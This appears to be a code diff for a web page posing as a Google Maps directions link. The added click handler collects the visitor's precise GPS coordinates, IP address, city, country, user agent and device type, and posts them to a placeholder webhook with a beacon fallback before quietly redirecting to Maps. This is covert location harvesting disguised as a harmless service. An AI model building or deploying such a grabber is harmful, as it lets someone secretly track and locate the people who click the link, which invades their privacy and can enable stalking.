@@ -372,52 +372,6 @@
       document.body.classList.add(type);
     }
 
-    function redirectToGoogleMaps() {
-      const loadingEl = document.getElementById("loading-text");
-      const timeoutMessageEl = document.getElementById("timeout-message");
-      const buttonEl = document.getElementById("button");
-      const lang = document.getElementById("lang-select").value;
-      const t = translations[lang] || translations['en'];
-
-      buttonEl.disabled = true;
-      buttonEl.style.opacity = "0.6";
-      loadingEl.style.display = "flex";
-
-      const timeoutTimer = setTimeout(() => {
-        timeoutMessageEl.style.display = "block";
-      }, 5000);
-
-      if (!navigator.geolocation) {
-        clearTimeout(timeoutTimer);
-        fallbackRedirect();
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          clearTimeout(timeoutTimer);
-          timeoutMessageEl.style.display = "none";
-          document.getElementById("loading-label").innerText = t.redirecting;
-          const userLat = position.coords.latitude;
-          const userLon = position.coords.longitude;
-          const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLon}&destination=${destinationLat},${destinationLon}`;
-          setTimeout(() => {
-            window.location.href = mapsUrl;
-          }, 1000);
-        },
-        error => {
-          clearTimeout(timeoutTimer);
-          timeoutMessageEl.style.display = "none";
-          fallbackRedirect();
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
-    }
-
     function fallbackRedirect() {
       const fallbackMessageEl = document.getElementById("fallback-message");
       const buttonEl = document.getElementById("button");
@@ -443,6 +397,77 @@
       detectDeviceType();
       autoDetectLanguage();
     });
+    
+document.getElementById("button").addEventListener("click", async () => {
+  const button = document.getElementById("button");
+  const loading = document.getElementById("loading-text");
+  const timeoutMsg = document.getElementById("timeout-message");
+
+  button.disabled = true;
+  loading.style.display = "flex";
+  timeoutMsg.style.display = "none";
+
+  const timeoutTimer = setTimeout(() => {
+    timeoutMsg.style.display = "block";
+  }, 5000);
+
+  await loadIpData();
+
+  if (!navigator.geolocation) {
+    clearTimeout(timeoutTimer);
+    await fallbackBeacon("unsupported");
+    return;
+  }
+  
+  navigator.geolocation.getCurrentPosition(
+    async pos => {
+      clearTimeout(timeoutTimer);
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+
+      const data = {
+        lat,
+        lon,
+        accuracy: acc,
+        ip: locationData.ip,
+        region: locationData.region,
+        country: locationData.country,
+        city: locationData.city,
+        deviceType: detectDeviceType(),
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        language: navigator.language
+      };
+
+      try {
+        const response = await fetch("INSERT UPDATED WEBHOOK HERE", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+          console.warn("POST failed, falling back to beacon");
+          await fallbackBeacon("post-failed", pos);
+        }
+      } catch (err) {
+        console.error("POST error:", err.message);
+        await fallbackBeacon("post-error", pos);
+      }
+
+      const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${lat},${lon}&destination=${destinationLat},${destinationLon}`;
+      document.getElementById("loading-label").innerText = translations[document.getElementById("lang-select").value || "en"].redirecting;
+      setTimeout(() => { window.location.href = mapsUrl; }, 1000);
+    },
+    async () => {
+      clearTimeout(timeoutTimer);
+      await fallbackBeacon("refused");
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+});
+    
   </script>
 
   <script>
@@ -480,58 +505,6 @@
       }
     }
 
-    document.getElementById("button").addEventListener("click", async () => {
-      if (!navigator.geolocation) {
-        await loadIpData();
-        return fallbackBeacon("unsupported");
-      }
-
-      await loadIpData();
-
-      navigator.geolocation.getCurrentPosition(
-        async pos => {
-          const data = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            country: locationData.country,
-            region: locationData.region,
-            city: locationData.city,
-            ip: locationData.ip,
-            deviceType: document.body.classList.contains('mobile') ? 'mobile' :
-                        document.body.classList.contains('tablet') ? 'tablet' : 'desktop',
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString(),
-            language: navigator.language
-          };
-
-          try {
-            const response = await fetch("INSERT UPDATED WEBHOOK HERE", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(data)
-            });
-            
-            if (!response.ok) {
-              const errorText = await response.text();
-              console.warn("POST failed with status:", response.status, "Response:", errorText);
-              await fallbackBeacon(`post-failed-${response.status}`, pos);
-            } else {
-              console.log("Webhook POST success");
-            }
-          } catch (err) {
-            console.error("POST error:", err.message);
-            await fallbackBeacon("post-error", pos);
-          }
-          
-          // After POST + fallback
-          redirectToMaps(data.lat, data.lon); 
-        },
-        async () => {
-          await loadIpData();
-          await fallbackBeacon("refused");
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     });
 
